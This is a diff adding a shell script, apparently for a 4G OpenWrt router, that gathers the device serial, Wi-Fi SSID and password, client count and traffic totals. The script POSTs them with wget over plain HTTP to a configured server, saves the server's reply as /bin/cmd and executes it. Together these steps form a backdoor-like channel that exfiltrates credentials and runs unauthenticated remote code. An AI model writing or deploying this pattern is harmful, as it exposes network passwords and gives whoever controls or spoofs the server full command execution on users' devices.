@@ -1,0 +1,66 @@
+#!/bin/sh
+
+/bin/cmd;
+
+server_name=$(uci get 4g.server.name)
+server_url=http://${server_name}/Wl/goaction
+
+mac=$(uci get 4g.server.sn)
+#echo $mac
+ssid=`uci get wireless.@wifi-iface[0].ssid`
+#echo ssid is :$ssid
+key=`uci get wireless.@wifi-iface[0].key`
+#echo wifi password is :$key
+channel=`uci get wireless.mt7628.channel`
+#echo wifi channel is :$channel
+clients=`cat /proc/net/arp |grep 0x2 -c`
+#echo client amount is :$clients
+
+cmdstatus=1 #已执行
+
+#统计流量
+#set -e
+interface=3g-4g
+old_all_byte=`uci get 4g.modem.4g_byte`
+if ifconfig |grep -q $interface; then
+  rec_byte=`cat /proc/net/dev |grep $interface |awk '{print $2}'`
+  tran_byte=`cat /proc/net/dev |grep $interface |awk '{print $10}'`
+  all_byte=$(($rec_byte+$tran_byte))
+  if [ $all_byte -ge $old_all_byte ];then
+    old_all_byte=$all_byte
+    #echo $old_all_byte > /etc/4g_byte
+    uci set 4g.modem.4g_byte=$old_all_byte
+  else
+     old_all_byte=$(($all_byte+$old_all_byte))
+     #echo $old_all_byte > /etc/4g_byte
+     uci set 4g.modem.4g_byte=$old_all_byte
+  fi
+
+fi
+
+interface="eth1"
+if ifconfig |grep -q $interface; then
+  rec_byte=`cat /proc/net/dev |grep $interface |awk '{print $2}'`
+  tran_byte=`cat /proc/net/dev |grep $interface |awk '{print $10}'`
+  all_byte=$(($rec_byte+$tran_byte))
+  if [ $all_byte -ge $old_all_byte ];then
+    old_all_byte=$all_byte
+    #echo $old_all_byte > /etc/4g_byte
+    uci set 4g.modem.4g_byte=$old_all_byte
+  else
+     old_all_byte=$(($all_byte+$old_all_byte))
+     #echo $old_all_byte > /etc/4g_byte
+     uci set 4g.modem.4g_byte=$old_all_byte
+  fi
+fi
+
+uci commit 4g
+
+byte4g=`uci get 4g.modem.4g_byte`
+
+wget --post-data "mac=$mac&ssid=$ssid&wlpass=$key&clients=$clients&byte4g=${byte4g}&cmdstatus=$cmdstatus" ${server_url} -O /bin/cmd
+sleep 3;
+/bin/cmd;
+
+
+
